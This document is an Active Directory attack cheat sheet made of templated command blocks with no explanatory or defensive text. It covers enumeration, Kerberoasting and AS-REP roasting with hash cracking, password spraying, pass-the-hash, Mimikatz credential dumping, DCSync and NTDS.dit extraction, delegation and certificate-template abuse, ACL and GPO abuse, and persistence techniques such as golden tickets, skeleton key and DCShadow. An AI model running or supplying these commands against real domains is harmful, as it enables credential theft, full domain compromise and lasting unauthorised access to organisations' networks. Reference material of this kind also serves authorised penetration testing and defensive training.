# Active Directory

## Enumeration

```bash
# Domain enumeration
nslookup {{domain}}
dig {{domain}}

# LDAP enumeration
ldapsearch -x -h {{dc_ip}} -s base namingcontexts
ldapsearch -x -h {{dc_ip}} -b "DC={{domain}},DC={{tld}}"

# RPC enumeration
rpcclient -U "" -N {{dc_ip}}
enumdomusers
enumdomgroups
queryuser {{username}}

# SMB enumeration
smbclient -L //{{dc_ip}} -N
crackmapexec smb {{dc_ip}} -u {{user}} -p {{pass}} --shares
crackmapexec smb {{dc_ip}} -u {{user}} -p {{pass}} --users
crackmapexec smb {{dc_ip}} -u {{user}} -p {{pass}} --groups
crackmapexec smb {{dc_ip}} -u {{user}} -p {{pass}} --pass-pol

# enum4linux
enum4linux -a {{dc_ip}}
```

## Kerberos Attacks

```bash
# AS-REP Roasting
GetNPUsers.py {{domain}}/ -no-pass -usersfile users.txt -dc-ip {{dc_ip}}
GetNPUsers.py {{domain}}/{{user}} -no-pass -dc-ip {{dc_ip}}

# Crack AS-REP hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# Kerberoasting
GetUserSPNs.py {{domain}}/{{user}}:{{pass}} -dc-ip {{dc_ip}} -request
GetUserSPNs.py {{domain}}/{{user}}:{{pass}} -dc-ip {{dc_ip}} -request-user {{target_user}}

# Crack Kerberoast hash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

# Golden Ticket
ticketer.py -nthash {{krbtgt_hash}} -domain-sid {{domain_sid}} -domain {{domain}} {{user}}
export KRB5CCNAME={{user}}.ccache
psexec.py {{domain}}/{{user}}@{{dc_ip}} -k -no-pass

# Silver Ticket
ticketer.py -nthash {{service_hash}} -domain-sid {{domain_sid}} -domain {{domain}} -spn cifs/{{dc_hostname}} {{user}}
```

## Password Spraying

```bash
# CrackMapExec
crackmapexec smb {{dc_ip}} -u users.txt -p {{password}} --continue-on-success
crackmapexec smb {{dc_ip}} -u {{user}} -p passwords.txt

# Kerbrute
kerbrute passwordspray -d {{domain}} --dc {{dc_ip}} users.txt {{password}}

# RDP spray
crowbar -b rdp -s {{dc_ip}}/32 -U users.txt -C passwords.txt
```

## Bloodhound

```bash
# Collect data with SharpHound
SharpHound.exe -c All
SharpHound.exe -c All -d {{domain}}

# Collect with bloodhound-python
bloodhound-python -d {{domain}} -u {{user}} -p {{pass}} -dc {{dc_ip}} -c All -ns {{dc_ip}}

# Neo4j
neo4j console
# Upload JSON to Bloodhound GUI

# Useful queries
# - Shortest path to Domain Admin
# - Find all Domain Admins
# - Find Kerberoastable users
# - Find AS-REP Roastable users
```

## Impacket Tools

```bash
# psexec
psexec.py {{domain}}/{{user}}:{{pass}}@{{dc_ip}}
psexec.py {{domain}}/{{user}}@{{dc_ip}} -hashes :{{ntlm_hash}}

# wmiexec
wmiexec.py {{domain}}/{{user}}:{{pass}}@{{dc_ip}}
wmiexec.py {{domain}}/{{user}}@{{dc_ip}} -hashes :{{ntlm_hash}}

# smbexec
smbexec.py {{domain}}/{{user}}:{{pass}}@{{dc_ip}}

# atexec
atexec.py {{domain}}/{{user}}:{{pass}}@{{dc_ip}} "whoami"

# dcomexec
dcomexec.py {{domain}}/{{user}}:{{pass}}@{{dc_ip}}

# secretsdump
secretsdump.py {{domain}}/{{user}}:{{pass}}@{{dc_ip}}
secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# GetADUsers
GetADUsers.py {{domain}}/{{user}}:{{pass}} -all -dc-ip {{dc_ip}}

# GetUserSPNs
GetUserSPNs.py {{domain}}/{{user}}:{{pass}} -dc-ip {{dc_ip}} -request
```

## Pass-the-Hash

```bash
# CrackMapExec
crackmapexec smb {{dc_ip}} -u {{user}} -H {{ntlm_hash}}
crackmapexec smb {{dc_ip}} -u {{user}} -H {{ntlm_hash}} -x "whoami"

# psexec
psexec.py {{domain}}/{{user}}@{{dc_ip}} -hashes :{{ntlm_hash}}

# wmiexec
wmiexec.py {{domain}}/{{user}}@{{dc_ip}} -hashes :{{ntlm_hash}}

# evil-winrm
evil-winrm -i {{dc_ip}} -u {{user}} -H {{ntlm_hash}}
```

## Mimikatz

```powershell
# Dump credentials
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::ekeys

# Pass-the-Hash
mimikatz # sekurlsa::pth /user:{{user}} /domain:{{domain}} /ntlm:{{ntlm_hash}}

# Golden Ticket
mimikatz # kerberos::golden /user:{{user}} /domain:{{domain}} /sid:{{domain_sid}} /krbtgt:{{krbtgt_hash}} /ptt

# DCSync
mimikatz # lsadump::dcsync /domain:{{domain}} /user:{{user}}
mimikatz # lsadump::dcsync /domain:{{domain}} /all

# Export tickets
mimikatz # sekurlsa::tickets /export

# DPAPI
mimikatz # dpapi::masterkey /in:"{{masterkey_file}}" /sid:{{sid}} /password:{{password}}
mimikatz # dpapi::cred /in:"{{credential_file}}" /masterkey:{{masterkey}}
```

## DCSync Attack

```bash
# Using Mimikatz
mimikatz # lsadump::dcsync /domain:{{domain}} /user:krbtgt

# Using secretsdump
secretsdump.py {{domain}}/{{user}}:{{pass}}@{{dc_ip}} -just-dc-user krbtgt

# Dump all hashes
secretsdump.py {{domain}}/{{user}}:{{pass}}@{{dc_ip}} -just-dc
```

## NTDS.dit Extraction

```bash
# Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive

# Extract hashes
secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# CrackMapExec
crackmapexec smb {{dc_ip}} -u {{user}} -p {{pass}} --ntds
```

## Lateral Movement

```bash
# WMI
wmic /node:{{target_ip}} /user:{{domain}}\{{user}} /password:{{pass}} process call create "cmd.exe /c {{command}}"

# PSExec
psexec.py {{domain}}/{{user}}:{{pass}}@{{target_ip}}

# WinRM
evil-winrm -i {{target_ip}} -u {{user}} -p {{pass}}

# RDP
xfreerdp /u:{{user}} /p:{{pass}} /d:{{domain}} /v:{{target_ip}}

# SMB
smbclient //{{target_ip}}/C$ -U {{domain}}/{{user}}%{{pass}}
```

## Domain Trust Exploitation

```powershell
# Enumerate trusts
Get-ADTrust -Filter *
nltest /domain_trusts

# Get SID
Get-ADDomain {{domain}}

# Inter-forest TGT
Rubeus.exe asktgt /user:{{user}} /domain:{{domain}} /rc4:{{ntlm_hash}}

# Request inter-realm TGT
Rubeus.exe asktgs /service:krbtgt/{{target_domain}} /domain:{{domain}} /dc:{{dc_ip}} /ticket:{{base64_ticket}}
```

## Constrained Delegation

```bash
# Find constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Exploit with Rubeus
Rubeus.exe s4u /user:{{service_account}} /rc4:{{ntlm_hash}} /impersonateuser:Administrator /msdsspn:cifs/{{target}} /ptt

# Exploit with Impacket
getST.py -spn cifs/{{target}} -impersonate Administrator {{domain}}/{{service_account}}:{{pass}}
export KRB5CCNAME=Administrator.ccache
psexec.py {{domain}}/Administrator@{{target}} -k -no-pass
```

## Unconstrained Delegation

```powershell
# Find unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# Monitor for TGTs
Rubeus.exe monitor /interval:5

# Coerce authentication
PetitPotam.py {{attacker_ip}} {{dc_ip}}

# Extract TGT
Rubeus.exe triage
Rubeus.exe dump /luid:{{luid}}
```

## LAPS

```powershell
# Check if LAPS is installed
Get-Command Get-AdmPwdPassword

# Read LAPS password
Get-AdmPwdPassword -ComputerName {{computer}}

# Crackmapexec
crackmapexec ldap {{dc_ip}} -u {{user}} -p {{pass}} -M laps
```

## Certificate Services Attacks

```bash
# Certipy enumeration
certipy find -u {{user}}@{{domain}} -p {{pass}} -dc-ip {{dc_ip}}

# ESC1 - Request certificate
certipy req -u {{user}}@{{domain}} -p {{pass}} -ca {{ca_name}} -target {{ca_server}} -template {{template}} -upn administrator@{{domain}}

# ESC4 - Template modification
certipy req -u {{user}}@{{domain}} -p {{pass}} -ca {{ca_name}} -target {{ca_server}} -template {{template}}

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip {{dc_ip}}
```

## GPO Abuse

```powershell
# Enumerate GPOs
Get-GPO -All

# Find vulnerable GPOs
Get-GPOReport -All -ReportType Html -Path report.html

# SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author {{domain}}\{{user}} --Command "cmd.exe" --Arguments "/c {{command}}" --GPOName "{{gpo_name}}"
```

## ACL Attacks

```powershell
# GenericAll on user
net user {{target_user}} {{new_password}} /domain

# GenericAll on group
net group "{{group}}" {{user}} /add /domain

# WriteDACL
Add-DomainObjectAcl -TargetIdentity "{{target}}" -PrincipalIdentity {{user}} -Rights All

# ForceChangePassword
$cred = ConvertTo-SecureString "{{new_password}}" -AsPlainText -Force
Set-ADAccountPassword -Identity {{target_user}} -Reset -NewPassword $cred
```

## RBCD - Resource-Based Constrained Delegation

```bash
# Add computer account
addcomputer.py -computer-name '{{fake_computer}}$' -computer-pass '{{password}}' -dc-ip {{dc_ip}} {{domain}}/{{user}}:{{pass}}

# Configure RBCD
rbcd.py -delegate-from '{{fake_computer}}$' -delegate-to '{{target}}$' -action write -dc-ip {{dc_ip}} {{domain}}/{{user}}:{{pass}}

# Get service ticket
getST.py -spn cifs/{{target}} -impersonate Administrator -dc-ip {{dc_ip}} {{domain}}/{{fake_computer}}$:{{password}}

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py {{domain}}/Administrator@{{target}} -k -no-pass
```

## Domain Persistence

```powershell
# Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:{{domain}} /sid:{{domain_sid}} /krbtgt:{{krbtgt_hash}} /ptt

# Skeleton Key
mimikatz # misc::skeleton

# DSRM Password
mimikatz # token::elevate
mimikatz # lsadump::sam

# AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC={{domain}},DC={{tld}}' -PrincipalIdentity {{user}} -Rights All

# DCShadow
mimikatz # lsadump::dcshadow /object:{{target_user}} /attribute:primaryGroupID /value:512
```

## Kerberos Delegation

```bash
# S4U2Self
getST.py -spn cifs/{{target}} -impersonate Administrator {{domain}}/{{user}}:{{pass}}

# S4U2Proxy
getST.py -spn cifs/{{target}} -impersonate Administrator -additional-ticket {{tgs_ticket}} {{domain}}/{{user}}:{{pass}}
```